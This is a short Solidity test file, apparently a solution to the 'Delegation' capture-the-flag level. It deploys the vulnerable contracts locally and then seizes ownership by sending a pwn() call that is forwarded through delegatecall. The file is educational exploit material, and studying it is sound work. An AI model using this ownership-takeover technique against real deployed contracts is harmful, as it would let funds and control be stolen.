// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Delegate, Delegation} from "../src/Delegation.sol";
import {Test, console} from "forge-std/Test.sol";

contract DelegationSolution is Test {
    Delegate delegate;
    Delegation delegation;
    address public USER = makeAddr("user");
    address public ATTACKER = makeAddr("attacker");

    function setUp() public {
        delegate = new Delegate(USER);
        delegation = new Delegation(address(delegate));
    }

    function testDelegate() public {
        console.log("The attacker address: ", ATTACKER);
        vm.startPrank(ATTACKER);
        console.log("The owner of the contract before exploit: ", delegation.owner());
        (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        console.log("The owner of the contract after exploit: ", delegation.owner());
        vm.stopPrank();
        assertEq(success, true);
        assertEq(delegation.owner(), ATTACKER);
    }
}
